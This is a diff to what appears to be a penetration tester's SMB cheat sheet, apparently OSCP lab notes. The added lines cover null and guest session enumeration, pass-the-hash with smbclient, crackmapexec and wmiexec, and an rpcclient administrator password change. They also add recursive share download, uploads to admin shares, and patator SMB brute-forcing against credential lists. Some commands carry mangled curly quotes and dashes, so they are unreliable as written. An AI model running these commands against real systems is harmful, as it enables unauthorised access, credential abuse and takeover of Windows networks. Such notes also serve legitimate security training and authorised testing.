@@ -149,7 +149,9 @@ smbmap -H $ip
 ```
 
 ```
+smbmap -d <workgroup> -H $ip
 smbmap -u "" -p "" -d <workgroup> -H $ip
+smbmap -u guest -p "" -d <workgroup> -H $ip
 smbmap -u <user> -p <password> -d <workgroup> -H $ip
 smbmap -u <user> -p <password> -d <workgroup> -H $ip -L  #test command execution
 smbmap -u <user> -p <password> -d <workgroup> -H $ip -r  #read drive
@@ -172,6 +174,7 @@ smbmap -R $sharename -H $ip -A $fileyouwanttodownload -q
 
 ### smbclient
 
+- https://www.samba.org/samba/docs/current/man-html/smbclient.1.html
 - Client that can "talk" to an SMB/CIFS server
 - Operations
   - Upload/download functionality
@@ -183,6 +186,7 @@ smbclient \\192.168.13.236\some-share -o user=root,pass=root,workgroup=BOB
 
 ```
 smbclient -L $ip
+smbclient -L $ip -U guest -p 445 ""
 smbclient -L $ip -U $username -p 445
    password: <prompt>
 smbclient -L //server/share
@@ -198,6 +202,27 @@ smb: \> mget *
 Upload file:
 ```
 smbclient //192.168.31.142/ADMIN$ -U "nobody"%"somepassword" -c "put 40280.py"
+```
+
+```
+  Pass-the-hash:
+    smbclient -U testuser%<nthash> --pw-nt-hash -L 192.168.0.1
+    smbclient \\\\192.168.0.1\\domain -U testuser%<nthash> --pw-nt-hash
+
+  Map drives:
+    smbclient \\\\192.168.0.1\\sharename$
+    smbclient \\\\192.168.0.1\\sharename$ -U root%
+```
+
+Recursive download: https://superuser.com/questions/856617/how-do-i-recursively-download-a-directory-using-smbclient
+
+```
+smbclient ‘\10.11.1.220\SYSVOL’ -U=’contoso/jane%SuperPassword^’ -c ‘prompt OFF;recurse ON;lcd ‘./’;mget *’
+```
+
+Upload file: 
+```
+smbclient “\\10.20.20.115\Public” –user mike –pass mikey -c “put linenum-07-05-19”
 ```
 
 ### rpcclient
@@ -227,6 +252,9 @@ rpcclient $> enumalsgroups builtin
 rpcclient $> lookupnames james
 ```
 
+Change password: `setuserinfo2 administrator 23 ‘password1234’`
+Lookup SID: `lookupnames administrator`
+
 ### Enum4linux
 
 - Tool for enumerating information from Windows and Samba systems
@@ -249,6 +277,15 @@ enum4linux -U $ip
 
 > - Ref: https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/
 
+### nullinux
+
+https://github.com/m8r0wn/nullinux
+```
+python3 nullinux.py -users -quick DC1.Domain.net
+python3 nullinux.py -all 192.168.0.0-5
+python3 nullinux.py -shares -U 'Domain\User' -P 'Password1' 10.0.0.1,10.0.0.5
+```
+
 ### acccheck
 
 - Password attacks
@@ -260,6 +297,23 @@ acccheck -v -t $ip -u <user> -P <password_file>
 ### mblookup
 
 - NetBIOS over TCP/IP client used to lookup NetBIOS names
+
+### CrackMapExec
+Automate assessing the security of large Active Directory networks
+```
+crackmapexec smb <target(s)> -u username -H LMHASH:NTHASH
+crackmapexec smb <target(s)> -u username -H NTHASH
+```
+
+### Smbexec
+https://github.com/brav0hax/smbexec
+
+### wmiexec
+https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
+
+```
+ ./wmiexec.py -hashes <ntlmhash> Administrator@10.10.0.1
+```
 
 ## Mount SMB share
 
@@ -469,3 +523,14 @@ https://dzone.com/articles/fun-with-netbios-name-service-and-computer-browser
     - https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
     - https://vulners.com/exploitdb/EDB-ID:6824
     - `exploit/windows/smb/ms08_067_netapi`
+
+
+## Bruteforcing 
+
+```
+patator smb_login host=10.121.1.33 domain=CONTOSO user=COMBO00 password=COMBO01 0=/root/oscp/lab-net2019/combo-creds.txt -l smb_brute
+
+patator smb_login host=FILE0 domain=CONTOSO.LOCAL user=COMBO10 password=COMBO11 0=/root/oscp/lab-net2019/smb-open.txt 1=/root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep=”STATUS_LOGON_FAILURE”
+
+–timeout 100 –threads=2 –rate-limit=2 
+```
